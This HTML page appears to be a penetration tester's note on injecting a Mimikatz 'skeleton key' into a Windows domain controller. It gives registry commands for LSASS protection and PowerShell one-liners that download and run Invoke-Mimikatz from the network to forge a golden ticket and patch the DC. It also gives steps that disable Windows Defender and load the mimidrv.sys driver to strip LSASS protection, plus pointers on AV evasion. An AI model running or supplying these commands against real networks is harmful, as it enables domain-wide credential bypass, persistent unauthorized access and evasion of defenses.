<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Inject a Skeleton Key</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Inject a Skeleton Key</h1><br/><br /><strong>LSASS protected process</strong><br />From Windows Server 2012 R2 and Windows 8.1 lsass.exe can be made a <span style="text-decoration:underline;">protected process</span>, and hashes are no longer stored in memory.<br />To <span style="color:#1ce579;">enable</span>/<span style="color:#ff0000;">disable</span> LSASS protection(to take effect the DC need to restart), on command line:<br />   ◇ <span style="color:#1ce579;">enable</span> LSASS protection<br />       <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; reg query HKEY_LOCAL_MACHINE<span style="color:#ff9d00;font-weight:700">\</span>SYSTEM<span style="color:#ff9d00;font-weight:700">\</span>CurrentControlSet<span style="color:#ff9d00;font-weight:700">\</span>Control<span style="color:#ff9d00;font-weight:700">\</span>Lsa <span style="color:#ff9d00;font-weight:700">/</span>v RunAsPPL                     <span style="color:#0088ff;font-weight:400">#query for the value of RunAsPPL</span><br /><span style="color:#ff9d00;font-weight:700">PS</span>&gt; reg add HKEY_LOCAL_MACHINE<span style="color:#ff9d00;font-weight:700">\</span>SYSTEM<span style="color:#ff9d00;font-weight:700">\</span>CurrentControlSet<span style="color:#ff9d00;font-weight:700">\</span>Control<span style="color:#ff9d00;font-weight:700">\</span>Lsa <span style="color:#ff9d00;font-weight:700">/</span>v RunAsPPL <span style="color:#ff9d00;font-weight:700">/</span>t REG_DWORD <span style="color:#ff9d00;font-weight:700">/</span>d <span style="color:#333333;font-weight:400">1</span> <span style="color:#ff9d00;font-weight:700">/</span>f  <span style="color:#0088ff;font-weight:400">#enable LSA protection on the machine</span></pre></div><br />       check it with <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer">Sysinternals Process Explorer</a><br />       <a href=""><img src="images/1156-1.png" alt="images/1156-1.png" /></a><br />   ◇ <span style="color:#ff0000;">disable</span> LSASS protection<br />       <div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:\</span>&gt; reg add HKEY_LOCAL_MACHINE<span style="color:#ff9d00;font-weight:700">\</span>SYSTEM<span style="color:#ff9d00;font-weight:700">\</span>CurrentControlSet<span style="color:#ff9d00;font-weight:700">\</span>Control<span style="color:#ff9d00;font-weight:700">\</span>Lsa <span style="color:#ff9d00;font-weight:700">/</span>v RunAsPPL <span style="color:#ff9d00;font-weight:700">/</span>t REG_DWORD <span style="color:#ff9d00;font-weight:700">/</span>d <span style="color:#333333;font-weight:400">0</span> <span style="color:#ff9d00;font-weight:700">/</span>f  <span style="color:#0088ff;font-weight:400">#disable LSA protection on the machine</span></pre></div><br />       check it with <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer">Sysinternals Process Explorer</a><br />       <a href=""><img src="images/1156-2.png" alt="images/1156-2.png" /></a><br /><br />       <br />• LSASS protection <span style="color:#ff0000;">disabled</span>(or before Windows Server 2012 R2 and Windows 8.1):<br />      0. Once we have Domain Admin rights for example thannks to a <a href="--Post_Exploitation--Privilege_Escalation--Active_Directory(Windows)_Privilege_Escalation--Kerberos_Authentication_Attacks--Golden_Ticket.html">Golden Ticket</a><br />    <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; <span style="color:#ff9d00;font-weight:700">IEX</span>(<span style="color:#ff9d00;font-weight:700">New-Object</span> Net.WebClient).DownloadString(<span style="color:#3ad900;font-weight:400">&quot;https://raw.githubusercontent.com/BC-SECURITY/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1&quot;</span>);<span style="color:#00117f;font-weight:400">Invoke-Mimikatz</span> <span style="color:#ff9d00;font-weight:700">-</span>Command <span style="color:#333333;font-weight:400">&#39;&quot;kerberos::golden /user:Administrator /domain:DANIELE.local /sid:S-1-5-21-2492168702-2322743348-3414347950 /krbtgt:fde97d36054bc731495f5d88f458a7ce  /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt&quot;&#39;</span></pre></div><br />    1. Inject a Skeleton Key in the <span style="color:#ff8700;">Domain Controller</span>. The Skeleton Key would be “mimikatz” <br />    <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; <span style="color:#ff9d00;font-weight:700">IEX</span>(<span style="color:#ff9d00;font-weight:700">New-Object</span> Net.WebClient).DownloadString(<span style="color:#3ad900;font-weight:400">&quot;https://raw.githubusercontent.com/BC-SECURITY/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1&quot;</span>);<span style="color:#00117f;font-weight:400">Invoke-Mimikatz</span> <span style="color:#ff9d00;font-weight:700">-</span>Command <span style="color:#333333;font-weight:400">&#39;&quot;privilege::debug&quot; &quot;misc::skeleton&quot;&#39;</span> <span style="color:#ff9d00;font-weight:700">-</span>ComputerName &lt;hostnameDC&gt;.&lt;FQDN&gt;</pre></div><br />       <a href=""><img src="images/1156-3.png" alt="images/1156-3.png" /></a><br />• LSASS protection <span style="color:#1ce579;">enabled</span>(from Windows Server 2012 R2): <br />   0. To verify that it is ebabled <br />       <div class="codebox"><pre>PS&gt; reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL     #the value is 0x1(hexadecimal of 1<br />mimikatz# sekurlsa::logonPasswords                                                    #we will get a handling error memory</pre></div><br />       <a href=""><img src="images/1156-4.png" alt="images/1156-4.png" /></a>      <br />   1. To bypass this restriction we need to load the mimikatz driver “mimidrv.sys” from the current working directory of mimikatz<br />       This mean also we cannot use the the Invoke-Mimikatz.ps1 script.<br />       From mimikatz on the <span style="color:#ff8700;">DC</span>:<br />       <div class="codebox"><pre>PS&gt; Set-MpPreference -DisableRealtimeMonitoring $true   #Disable Windows Defender(from Windows Server 2016)<br />PS&gt; \mimikatz.exe                                       #run mimikatz as Administrator<br />mimikatz# privilege::debug                              #<br />mimikatz# !+                                            #load the driver mimidrv.sys<br />mimikatz# !processprotect /process:lsass.exe /remove    #Remove Protection<br />mimikatz# misc::skeleton<br />mimikatz# !-                                            #remove the driver mimidrv.sys</pre></div><br />        <a href=""><img src="images/1156-5.png" alt="images/1156-5.png" /></a><br />       To understand how the mimdrv.sys driver work see the article of <a href="https://twitter.com/matterpreter">@matterpreter</a><br />       Note anyway that the <span style="text-decoration:underline;">command above will be very noisy in logs</span>, because of Service Installation(Kernel mode driver). Moreover because of the hash and composition of the file is known for the last 7 years. Even the least competent AV will probably detect it.<br />        For AV evasion there is a great post of <a href="https://medium.com/@gorkemkaradeniz/defeating-runasppl-utilizing-vulnerable-drivers-to-read-lsass-with-mimikatz-28f4b50b1de5">@gorkemkaradeniz</a> <br />       <br />       <br /><br />Bibliography:<br />• GitHub Invoke-Mimikatz.ps1: <a href="https://raw.githubusercontent.com/BC-SECURITY/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1">https://raw.githubusercontent.com/BC-SECURITY/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1</a><br />• <a href="https://www.scip.ch/en/?labs.20200116">https://www.scip.ch/en/?labs.20200116</a><br />• <a href="https://support.authlogics.com/hc/en-us/articles/360012317780-PPA-does-not-function-when-Windows-Local-Security-Authority-LSA-Protection-is-enabled?mobile_site=true">https://support.authlogics.com/hc/en-us/articles/360012317780-PPA-does-not-function-when-Windows-Local-Security-Authority-LSA-Protection-is-enabled?mobile_site=true</a></div>
</body>
</html>
